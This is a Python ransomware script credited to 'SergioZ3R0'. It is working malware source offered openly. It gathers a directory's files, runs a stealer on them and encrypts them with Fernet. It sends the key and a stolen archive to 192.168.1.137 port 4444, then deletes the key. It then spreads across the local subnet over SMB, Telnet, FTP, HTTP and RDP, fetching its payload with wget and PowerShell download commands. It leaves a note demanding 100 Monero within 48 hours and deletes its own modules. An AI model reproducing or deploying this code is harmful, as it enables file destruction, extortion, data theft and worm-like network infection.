# Author: SergioZ3R0
#region Imports
from time import sleep
import subprocess
import sys
imports = ["cryptography", "tk", "telnetlib", "pywinrm", "pysmb"]

# Install necessary modules
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

for module in imports:
    install(module)

# Import necessary modules
import os
import ctypes
import socket
from datetime import datetime
import time
from cryptography.fernet import Fernet
from ftplib import FTP
import telnetlib
import winrm
from smb.SMBConnection import SMBConnection
import spread
from stealer import stealer
#endregion

#region Definitions
files = []

def recorrer_arbol_directorios(directory):
    global files
    importantF = ["darthvader.py", "skywalker.py", "logo.png", "spread.py", "time_remaining.txt", "window(no usage).py", "stealer.py", "auto_run", "encryption_time.txt","READMEPLS.txt" , "README.md", "auto_run.py", "steal.zip"]
    try:
        for file in os.listdir(directory):
            rute_element = os.path.join(directory, file)
            if not os.path.islink(rute_element):
                if os.path.isdir(rute_element):
                    if "python" in rute_element.lower():
                        continue
                    print("Directory:", rute_element)
                    recorrer_arbol_directorios(rute_element)
                else:
                    if file.endswith('.py') or file.endswith(".deb") or file.endswith(".exe") or file in importantF:
                        continue
                    print("File:", rute_element)
                    files.append(rute_element)
    except Exception as e:
        pass
    print(files)

def send_file_to_host(file_path, host, port):
    with open(file_path, 'rb') as file:
        data = file.read()
        print(file)
        print(data)

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((host, port))
        s.sendall(data)

def unify_files(file1, file2, unified_file):
    with open(file1, 'r') as f1, open(file2, 'r') as f2, open(unified_file, 'w') as uf:
        uf.write(f1.read())
        uf.write('\n')
        uf.write(f2.read())
#endregion

#region Main
recorrer_arbol_directorios(input("Introduce la ruta del directorio inicial: "))

key = Fernet.generate_key()

with open("key.key", "wb") as key_file:
    key_file.write(key)

#region Stealer
stealer(files)
#endregion

for file in files:
    try:
        with open(file, "rb") as f:
            data = f.read()
        data_encrypted = Fernet(key).encrypt(data)
        with open(file, "wb") as f:
            f.write(data_encrypted)
    except Exception as e:
        print(f"Error encrypting file {file}: {e}")

with open("encryption_time.txt", "w") as f:
    f.write(str(datetime.now()))

unify_files('key.key', 'encryption_time.txt', 'unified_file.txt')

try:
    send_file_to_host('unified_file.txt', '192.168.1.137', 4444)
    sleep(5)
    send_file_to_host("steal.zip", "192.168.1.137", 4444)
except:
    pass

os.remove("key.key")
os.remove("encryption_time.txt")
os.remove("unified_file.txt")

#region Spread
network_prefix = "192.168.1"
try:
    open_smb_hosts = spread.scan_network_for_smb(network_prefix)
    for host in open_smb_hosts:
        spread.upload_script_to_smb(host, "./auto_run")

    open_telnet_hosts = spread.scan_network_for_telnet(network_prefix)
    for host in open_telnet_hosts:
        spread.execute_command_on_telnet(host, "wget https://github.com/SergioZ3R0/Sergio-Code/blob/master/cyberSec/pythonRandsomware/auto_run.py")

    open_ftp_hosts = spread.scan_network_for_ftp(network_prefix)
    for host in open_ftp_hosts:
        spread.upload_script_to_ftp(host, "./auto_run")

    open_http_hosts = spread.scan_network_for_http(network_prefix)
    for host in open_http_hosts:
        spread.upload_script_to_http(host, "./auto_run")

    open_rdp_hosts = spread.scan_network_for_rdp(network_prefix)
    for host in open_rdp_hosts:
        spread.execute_command_on_rdp(host, "powershell -c (New-Object Net.WebClient).DownloadFile('http://example.com/auto_run', 'auto_run')")

except Exception as e:
    print(f"Error spreading: {e}")
#endregion

# Write the content of the window module to READMEPLS.txt
with open("READMEPLS.txt", "w") as readme_file:
    readme_file.write("Ransomware is a type of malicious software designed to block access to a computer system until a sum of money is paid. It typically spreads through phishing emails or by exploiting vulnerabilities in software. Once a system is infected, the ransomware encrypts files and demands a ransom to restore access.\n")
    readme_file.write("To decrypt your files, pay 100 Monero (XMR) to my wallet (WALLET).\n")
    readme_file.write("You have 48 hours to pay the ransom. After that, your files will be permanently deleted.\n")

os.remove("auto_run.py")
os.remove("stealer.py")
os.remove("spread.py")
os.remove("darthvader.py")
#endregion